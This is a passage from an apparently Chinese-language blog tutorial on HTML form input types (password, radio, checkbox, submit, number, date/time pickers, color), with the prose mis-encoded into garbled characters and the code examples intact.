attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form>    Username:<br>    <input type="text" name="username">    <br>    Password:<br>    <input type="password" name="password"></form> <br><p>ä¸Šé¢è¿™ä¸ªå¯†ç ï¼Œpassword å­—æ®µä¸­çš„å­—ç¬¦ä¼šè¢«åšæ©ç å¤„ç†ï¼ˆæ˜¾ç¤ºä¸ºæ˜Ÿå·æˆ–å®å¿ƒåœ†ï¼‰ã€‚</p><br><h4 id="å•é€‰æŒ‰é’®è¾“å…¥-radio"><a href="#å•é€‰æŒ‰é’®è¾“å…¥-radio" class="headerlink" title="å•é€‰æŒ‰é’®è¾“å…¥ radio"></a>å•é€‰æŒ‰é’®è¾“å…¥ radio</h4><p><code>&lt;input type="radio"&gt;</code> å®šä¹‰å•é€‰æŒ‰é’®ã€‚</p><p>å•é€‰æŒ‰é’®å…è®¸ç”¨æˆ·åœ¨æœ‰é™æ•°é‡çš„é€‰é¡¹ä¸­é€‰æ‹©å…¶ä¸­ä¹‹ä¸€ã€‚</p><p>æ³¨æ„ï¼š<strong>nameå±æ€§è¦ç›¸åŒ</strong>ï¼Œå¦åˆ™å¯ä»¥ç‚¹å‡»ä¸åŒé€‰é¡¹ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>male<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span><span class="token punctuation">&gt;</span></span>Male    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Female<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form>    <input type="radio" name="sex" value="male" checked="">Male    <br>    <input type="radio" name="sex" value="female">Female</form> <br><h4 id="å¤é€‰æ¡†è¾“å…¥-checkbox"><a href="#å¤é€‰æ¡†è¾“å…¥-checkbox" class="headerlink" title="å¤é€‰æ¡†è¾“å…¥ checkbox"></a>å¤é€‰æ¡†è¾“å…¥ checkbox</h4><p><code>&lt;input type="checkbox"&gt;</code> å®šä¹‰å¤é€‰æ¡†ã€‚</p><p>å¯ä»¥åœ¨æœ‰é™æ•°é‡çš„é€‰é¡¹ä¸­é€‰æ‹©é›¶ä¸ªæˆ–å¤šä¸ªé€‰é¡¹ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>animal<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cat<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>cat    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>animal<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dog<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>dog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form>    <input type="checkbox" name="animal" value="cat">cat    <br>    <input type="checkbox" name="animal" value="dog">dog</form> <br><p><em>ï¼ˆå¥½åƒè¿™ä¸ªåœ¨åšå®¢é‡Œçœ‹ä¸åˆ°æ•ˆæœi</em></p><h4 id="æäº¤æŒ‰é’®-submit"><a href="#æäº¤æŒ‰é’®-submit" class="headerlink" title="æäº¤æŒ‰é’® submit"></a>æäº¤æŒ‰é’® submit</h4><p><code>&lt;input type="submit"&gt;</code> å®šä¹‰ç”¨äºå‘è¡¨å•å¤„ç†ç¨‹åº<em>ï¼ˆform-handlerï¼‰</em>æäº¤è¡¨å•çš„æŒ‰é’®ã€‚</p><p>è¡¨å•å¤„ç†ç¨‹åºé€šå¸¸æ˜¯åŒ…å«ç”¨æ¥å¤„ç†è¾“å…¥æ•°æ®çš„è„šæœ¬çš„æœåŠ¡å™¨é¡µé¢ï¼Œå°±æ˜¯å‰é¢è¯´çš„<code>action</code>å±æ€§æŒ‡å®šçš„ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mickey<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mouse<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form action="#">    First name:<br>    <input type="text" name="firstname" value="Mickey">    <br>    Last name:<br>    <input type="text" name="lastname" value="Mouse">    <br><br>    <input type="submit" value="Submit"></form> <br><h4 id="æŒ‰é’®-button"><a href="#æŒ‰é’®-button" class="headerlink" title="æŒ‰é’® button"></a>æŒ‰é’® button</h4><p><code>&lt;input type="button"&gt;</code> å®šä¹‰æŒ‰é’®ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert(<span class="token punctuation">'</span>Hello World!<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Click Me!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span></code></pre><p><button type="button" onclick="alert('Hello World!')">Click Me!</button></p><br><p>é€šè¿‡<code>onclick</code>ç­‰å±æ€§æ¥æŒ‡å®šè¯¥æŒ‰é’®çš„åŠŸèƒ½ã€‚</p><hr><p>ä»¥ä¸‹ä¸ºHTML5ä¸­çš„æ–°å¢çš„ç±»å‹ï¼š</p><blockquote><p>color, date, datetime, datetime-local, email, month, number, range, search, tel, time, url, week</p></blockquote><h4 id="æ•°å­—å€¼çš„è¾“å…¥-number"><a href="#æ•°å­—å€¼çš„è¾“å…¥-number" class="headerlink" title="æ•°å­—å€¼çš„è¾“å…¥ number"></a>æ•°å­—å€¼çš„è¾“å…¥ number</h4><p><code>&lt;input type="number"&gt;</code> ç”¨äºåº”è¯¥åŒ…å«æ•°å­—å€¼çš„è¾“å…¥å­—æ®µã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Quantity (between 1 and 5):  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quantity<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Quantity (between 1 and 5):  <input type="number" name="quantity" min="1" max="5"></form><br><p>å¯ä»¥å¯¹è¾“å…¥è¿›è¡Œé™åˆ¶ï¼Œæ¯”å¦‚ä»¥ä¸‹å±æ€§ã€‚</p><table><thead><tr><th>å±æ€§</th><th>æè¿°</th></tr></thead><tbody><tr><td>disabled</td><td>è§„å®šè¾“å…¥å­—æ®µåº”è¯¥è¢«ç¦ç”¨ã€‚</td></tr><tr><td>max</td><td>è§„å®šè¾“å…¥å­—æ®µçš„æœ€å¤§å€¼ã€‚</td></tr><tr><td>maxlength</td><td>è§„å®šè¾“å…¥å­—æ®µçš„æœ€å¤§å­—ç¬¦æ•°ã€‚</td></tr><tr><td>min</td><td>è§„å®šè¾“å…¥å­—æ®µçš„æœ€å°å€¼ã€‚</td></tr><tr><td>pattern</td><td>è§„å®šé€šè¿‡å…¶æ£€æŸ¥è¾“å…¥å€¼çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</td></tr><tr><td>readonly</td><td>è§„å®šè¾“å…¥å­—æ®µä¸ºåªè¯»ï¼ˆæ— æ³•ä¿®æ”¹ï¼‰ã€‚</td></tr><tr><td>required</td><td>è§„å®šè¾“å…¥å­—æ®µæ˜¯å¿…éœ€çš„ï¼ˆå¿…éœ€å¡«å†™ï¼‰ã€‚</td></tr><tr><td>size</td><td>è§„å®šè¾“å…¥å­—æ®µçš„å®½åº¦ï¼ˆä»¥å­—ç¬¦è®¡ï¼‰ã€‚</td></tr><tr><td>step</td><td>è§„å®šè¾“å…¥å­—æ®µçš„åˆæ³•æ•°å­—é—´éš”ã€‚</td></tr><tr><td>value</td><td>è§„å®šè¾“å…¥å­—æ®µçš„é»˜è®¤å€¼ã€‚</td></tr></tbody></table><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Quantity:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>points<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">step</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Quantity:  <input type="number" name="points" min="0" max="100" step="10" value="30"></form><br><p>æœ‰ä¸ªå‘ï¼Œå¦‚æœæŒ‡å®šäº†<code>step</code>æ—¶ï¼Œä½ æŒ‡å®šçš„<code>max</code>å±æ€§çš„å€¼ä¸ä¸€å®šæ˜¯å¯ä»¥å–å¾—åˆ°çš„å‘¢ã€‚</p><p>æ¯”å¦‚min=1ï¼Œmax=100ï¼Œstep=10ï¼Œåˆ™èƒ½å–åˆ°çš„å€¼ä¸ºç‰¹å®šçš„1ï¼Œ11ï¼Œ21ï¼Œâ€¦ï¼Œ91. å¯ä»¥è¯•ä¸€è¯•ã€‚</p><form>  Quantity:  <input type="number" name="points" min="1" max="100" step="10"></form><br><h4 id="æ—¥æœŸè¾“å…¥-date"><a href="#æ—¥æœŸè¾“å…¥-date" class="headerlink" title="æ—¥æœŸè¾“å…¥ date"></a>æ—¥æœŸè¾“å…¥ date</h4><p>ä¸‹é¢çš„å‡ ä¸ªéƒ½æ˜¯æ—¥æœŸé€‰æ‹©å™¨ï¼ˆDate Pickersï¼‰ï¼š</p><ul><li>date - é€‰å–æ—¥ã€æœˆã€å¹´</li><li>month - é€‰å–æœˆã€å¹´</li><li>week - é€‰å–å‘¨å’Œå¹´</li><li>time - é€‰å–æ—¶é—´ï¼ˆå°æ—¶å’Œåˆ†é’Ÿï¼‰</li><li>datetime - é€‰å–æ—¶é—´ã€æ—¥ã€æœˆã€å¹´ï¼ˆUTC æ—¶é—´ï¼‰</li><li>datetime-local - é€‰å–æ—¶é—´ã€æ—¥ã€æœˆã€å¹´ï¼ˆæœ¬åœ°æ—¶é—´ï¼‰</li></ul><br><p><code>&lt;input type="date"&gt;</code> ç”¨äºåº”è¯¥åŒ…å«æ—¥æœŸçš„è¾“å…¥å­—æ®µã€‚</p><p>ç‚¹å‡»åä¼šå¼¹å‡ºä¸€ä¸ªæ—¥æœŸé€‰æ‹©æ¡†ï¼Œæäº¤ä¹‹åçš„å€¼æ ¼å¼ç±»ä¼¼äº <code>day=2020-02-18</code>ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  è¾“å…¥ä¸€ä¸ªæ—¥æœŸå§ï¼š  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>day<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form action="#">  è¾“å…¥ä¸€ä¸ªæ—¥æœŸå§ï¼š  <input type="date" name="day">  <input type="submit"></form><br><p>å½“ç„¶ä¹Ÿå¯ä»¥<strong>æ·»åŠ é™åˆ¶</strong>å•¦ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Enter a date before 1990-01-01:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bday<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1989-12-31<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>  Enter a date after 2020-01-01:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bday<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2020-01-02<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Enter a date before 1990-01-01:  <input type="date" name="bday" max="1989-12-31"><br>  Enter a date after 2020-01-01:  <input type="date" name="bday" min="2020-01-02"><br></form><br><h4 id="æœˆä»½è¾“å…¥-month"><a href="#æœˆä»½è¾“å…¥-month" class="headerlink" title="æœˆä»½è¾“å…¥ month"></a>æœˆä»½è¾“å…¥ month</h4><p><code>&lt;input type="month"&gt;</code> å…è®¸ç”¨æˆ·é€‰æ‹©æœˆä»½å’Œå¹´ä»½ã€‚</p><p>è¿™ä¸ªåœ¨ Firefox ä¸Šä¸æ”¯æŒï¼ŒChrome ä¸Šæ˜¯å¯ä»¥çš„ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Birthday (month and year):  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>month<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bdaymonth<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Birthday (month and year):  <input type="month" name="bdaymonth"></form><br><h4 id="å‘¨è¾“å…¥-week"><a href="#å‘¨è¾“å…¥-week" class="headerlink" title="å‘¨è¾“å…¥ week"></a>å‘¨è¾“å…¥ week</h4><p><code>&lt;input type="week"&gt;</code> å…è®¸ç”¨æˆ·é€‰æ‹©å‘¨å’Œå¹´ã€‚</p><p>åœ¨ Firefox ä¸Šå¥½åƒä¹Ÿä¸æ”¯æŒã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Select a week:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>week<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>week_year<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Select a week:  <input type="week" name="week_year"></form><br><h4 id="æ— æ—¶åŒºæ—¶é—´è¾“å…¥-time"><a href="#æ— æ—¶åŒºæ—¶é—´è¾“å…¥-time" class="headerlink" title="æ— æ—¶åŒºæ—¶é—´è¾“å…¥ time"></a>æ— æ—¶åŒºæ—¶é—´è¾“å…¥ time</h4><p><code>&lt;input type="time"&gt;</code> é€‰æ‹©æ—¶é—´ï¼ˆæ— æ—¶åŒºï¼‰ã€‚</p><p>Firefox ä¹Ÿä¸æ”¯æŒã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Select a time:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>time<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>usr_time<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Select a time:  <input type="time" name="usr_time"></form><br><h4 id="æœ‰æ—¶åŒºæ—¶é—´è¾“å…¥-datetime"><a href="#æœ‰æ—¶åŒºæ—¶é—´è¾“å…¥-datetime" class="headerlink" title="æœ‰æ—¶åŒºæ—¶é—´è¾“å…¥ datetime"></a>æœ‰æ—¶åŒºæ—¶é—´è¾“å…¥ datetime</h4><p><code>&lt;input type="datetime"&gt;</code> é€‰æ‹©æ—¶é—´ï¼ˆæ— æ—¶åŒºï¼‰ã€‚</p><p>Chromeã€Firefox æˆ– Internet Explorer éƒ½ä¸æ”¯æŒ type=â€datetimeâ€ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Birthday (date and time):  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>datetime<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bdaytime<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Birthday (date and time):  <input type="datetime" name="bdaytime"></form><br><h4 id="æ— æ—¶åŒºæ—¶é—´è¾“å…¥-datetime-local"><a href="#æ— æ—¶åŒºæ—¶é—´è¾“å…¥-datetime-local" class="headerlink" title="æ— æ—¶åŒºæ—¶é—´è¾“å…¥ datetime-local"></a>æ— æ—¶åŒºæ—¶é—´è¾“å…¥ datetime-local</h4><p><code>&lt;input type="datetime-local"&gt;</code> é€‰æ‹©æ—¥æœŸå’Œæ—¶é—´ï¼ˆæ— æ—¶åŒºï¼‰ã€‚</p><p>Firefox æˆ–è€… Internet Explorer ä¸æ”¯æŒã€‚Chrome æ”¯æŒã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  è¾“å…¥ä¸€ä¸ªå…·ä½“æ—¶é—´ï¼ˆæ—¥æœŸå’Œæ—¶é—´ï¼‰ï¼š  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>datetime-local<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bdaytime<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Send<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form action="#">  è¾“å…¥ä¸€ä¸ªå…·ä½“æ—¶é—´ï¼ˆæ—¥æœŸå’Œæ—¶é—´ï¼‰ï¼š  <input type="datetime-local" name="bdaytime"></form><br><h4 id="é¢œè‰²è¾“å…¥-color"><a href="#é¢œè‰²è¾“å…¥-color" class="headerlink" title="é¢œè‰²è¾“å…¥ color"></a>é¢œè‰²è¾“å…¥ color</h4><p><code>&lt;input type="color"&gt;</code> ç”¨äºåº”è¯¥åŒ…å«é¢œè‰²çš„è¾“å…¥å­—æ®µã€‚</p><p>ç‚¹å‡»ä¼šå¼¹å‡ºé¢œè‰²é€‰æ‹©å™¨ã€‚</p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/color_picker.png" alt="é¢œè‰²é€‰æ‹©å™¨"></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Select your favorite color:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>color<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>favcolor<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Select your favorite color:  <input type="color" name="favcolor"></form><br><p>æäº¤çš„å€¼ç±»ä¼¼äº <code>favcolor=#ff1234</code>ï¼ˆurlencodeåä¸º <code>favcolor=%23ff1234</code>ï¼‰</p><p>åå…­è¿›åˆ¶å½¢å¼çš„é¢œè‰²RGBå½¢å¼ã€‚</p><h4 id="èŒƒå›´è¾“å…¥-range"><a href="#èŒƒå›´è¾“å…¥-range" class="headerlink" title="èŒƒå›´è¾“å…¥ range"></a>èŒƒå›´è¾“å…¥ range</h4><p><code>&lt;input type="range"&gt;</code> ç”¨äºåº”è¯¥åŒ…å«ä¸€å®šèŒƒå›´å†…çš„å€¼çš„è¾“å…¥å­—æ®µã€‚</p><p>æ 